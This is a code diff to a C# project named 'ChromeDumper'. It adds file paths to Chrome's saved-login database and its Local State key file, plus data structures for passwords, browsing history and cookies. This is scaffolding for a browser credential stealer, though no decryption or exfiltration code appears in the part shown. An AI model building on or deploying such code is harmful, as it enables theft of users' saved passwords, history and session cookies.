@@ -38,6 +38,8 @@ namespace ChromeDumper
         public clsDumper(string szChromeDirectory)
         {
             m_szChromeDirectory = szChromeDirectory;
+            _m_szLoginDataPath = $"{m_szChromeDirectory}\\User Data\\Default\\Login Data";
+            _m_szLocalState = $"{m_szChromeDirectory}\\User Data\\Local State";
         }
         public clsDumper()
         {
@@ -55,6 +57,16 @@ namespace ChromeDumper
             public string Password { get; set; }
             public DateTime CreationDate { get; set; }
             public DateTime LastUsedDate {  get; set; }
+        }
+        public struct stHistory
+        {
+            public string URL { get; set; }
+            public string Title { get; set; }
+            public DateTime VisitedDate { get; set; }
+        }
+        public struct stCookie
+        {
+
         }
 
         private bool fnbIsV10(byte[] abData) => Encoding.UTF8.GetString(abData.Take(3).ToArray()) == "v10";
